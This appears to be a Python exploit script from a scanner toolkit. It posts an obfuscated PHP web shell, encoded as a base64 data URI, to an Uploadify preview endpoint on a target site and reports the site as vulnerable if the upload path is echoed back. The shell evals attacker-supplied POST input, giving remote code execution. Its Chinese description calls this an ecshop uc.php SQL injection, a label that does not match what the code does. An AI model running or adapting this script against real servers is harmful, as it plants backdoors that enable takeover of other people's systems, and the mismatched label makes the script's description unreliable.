#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/index.php/api/Uploadify/preview"
bug ="/index.php/api/Uploadify/previewpreview/"
info ="存在ecshop uc.php参数code SQL注入漏洞"
qian ="preview"
hou = '", "id" : "id"}'

def main():
    res = HttpPost(url+payload,"data:image/php;base64,PD9waHAgJHN0cl90bXAgPSAiZXZhbCI7ICRzdHJfdG1wIC49ICIoIjskc3RyX3RtcCAuPSAiJCI7JHN0cl90bXAgLj0gIl9QTyI7JHN0cl90bXAgLj0gIlNUW2Rhb2VuXSk7IjtAZXZhbCgkc3RyX3RtcCk7","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info)#,GettextMiddle(res[0],qian,hou));


main()
